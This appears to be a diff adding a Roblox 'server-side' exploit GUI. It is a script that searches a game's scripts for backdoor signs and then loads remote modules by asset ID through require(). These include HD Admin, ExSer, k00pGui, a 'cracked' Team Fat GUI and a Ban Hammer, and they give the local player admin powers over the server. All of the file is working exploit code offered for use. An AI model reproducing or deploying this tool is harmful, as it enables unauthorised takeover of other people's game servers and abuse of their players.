@@ -1,0 +1,129 @@
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local UICorner = Instance.new("UICorner")
+local UIStroke = Instance.new("UIStroke")
+local Title = Instance.new("TextLabel")
+local SubTitle = Instance.new("TextLabel")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local UIGridLayout = Instance.new("UIGridLayout")
+
+ScreenGui.Name = "VoidlessServerList"
+ScreenGui.Parent = game:GetService("CoreGui")
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+Frame.Position = UDim2.new(0.5, -250, 0.5, -175)
+Frame.Size = UDim2.new(0, 500, 0, 350)
+Frame.BorderSizePixel = 0
+Frame.Active = true
+Frame.Draggable = true
+
+UIStroke.Parent = Frame
+UIStroke.Thickness = 2
+UIStroke.Color = Color3.fromRGB(40, 40, 40)
+
+UICorner.CornerRadius = UDim.new(0, 15)
+UICorner.Parent = Frame
+
+Title.Name = "Title"
+Title.Parent = Frame
+Title.BackgroundTransparency = 1
+Title.Position = UDim2.new(0, 0, 0, 10)
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.Font = Enum.Font.FredokaOne
+Title.Text = "SS Gui v1"
+Title.TextColor3 = Color3.fromRGB(200, 200, 200)
+Title.TextSize = 30
+Title.TextXAlignment = Enum.TextXAlignment.Center
+
+SubTitle.Name = "SubTitle"
+SubTitle.Parent = Frame
+SubTitle.BackgroundTransparency = 1
+SubTitle.Position = UDim2.new(0, 0, 0, 45)
+SubTitle.Size = UDim2.new(1, 0, 0, 20)
+SubTitle.Font = Enum.Font.SourceSansItalic
+SubTitle.Text = "Made by Voidless"
+SubTitle.TextColor3 = Color3.fromRGB(150, 150, 150)
+SubTitle.TextSize = 16
+SubTitle.TextXAlignment = Enum.TextXAlignment.Center
+
+ScrollingFrame.Parent = Frame
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundTransparency = 1
+ScrollingFrame.Position = UDim2.new(0, 20, 0, 80)
+ScrollingFrame.Size = UDim2.new(1, -40, 1, -110)
+ScrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+ScrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.X
+ScrollingFrame.ScrollingDirection = Enum.ScrollingDirection.X
+ScrollingFrame.ScrollBarThickness = 3
+ScrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(80, 80, 80)
+
+UIGridLayout.Parent = ScrollingFrame
+UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
+UIGridLayout.CellPadding = UDim2.new(0, 12, 0, 12)
+UIGridLayout.CellSize = UDim2.new(0, 140, 0, 45)
+UIGridLayout.StartCorner = Enum.StartCorner.TopLeft
+UIGridLayout.FillDirection = Enum.FillDirection.Vertical
+
+local lp = game:GetService("Players").LocalPlayer.Name
+
+function NewBtn(text, callback)
+    local Button = Instance.new("TextButton")
+    local Corner = Instance.new("UICorner")
+    
+    Button.Parent = ScrollingFrame
+    Button.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    Button.Font = Enum.Font.GothamBold
+    Button.Text = text
+    Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Button.TextSize = 16
+    Button.ClipsDescendants = true
+    
+    Corner.CornerRadius = UDim.new(0, 8)
+    Corner.Parent = Button
+    
+    Button.MouseButton1Click:Connect(callback)
+    return Button
+end
+
+local function Notify(msg)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "Voidless Scanner",
+        Text = msg,
+        Duration = 5
+    })
+end
+
+local function ScanBackdoor()
+    local found = false
+    for _, v in pairs(game:GetDescendants()) do
+        pcall(function()
+            if v:IsA("LuaSourceContainer") then
+                if string.find(v.Source, "require") or string.find(v.Source, "loadstring") or string.find(v.Source, "backdoor") then
+                    found = true
+                end
+            end
+        end)
+    end
+    
+    if found then
+        Notify("Backdoor Detected, Loaded HD Admin...")
+        task.wait(0.5)
+        require(7192763922).load(lp)
+    end
+end
+
+task.spawn(ScanBackdoor)
+
+NewBtn("ExSer", function() require(10868847330):pls(lp) end)
+NewBtn("All Seeing Hand", function() require(5375399205).Player(lp) end)
+NewBtn("HD Admin", function() require(7192763922).load(lp) end)
+NewBtn("Ban Hammer", function() require(5448035802).Hammer(lp,"BanHammer") end)
+NewBtn("Caducus", function() require(5686002742):Fire(lp,"caducus") end)
+NewBtn("Panel", function() require(13581457513):outthemoon(lp) end)
+NewBtn("Polaria SS", function() require(110951620907921):Pload(lp) end)
+NewBtn("k00pGui", function() require(15267263357).V11(lp) end)
+NewBtn("Team Fat Gui", function() require(13772265165).TeamFatGUICrackedByLua(lp) end)
+NewBtn("Saitama", function() require(14499140823)(lp, "saitama2") end)
+NewBtn("Gojo", function() require(14499140823)(lp, "sorcerer") end)
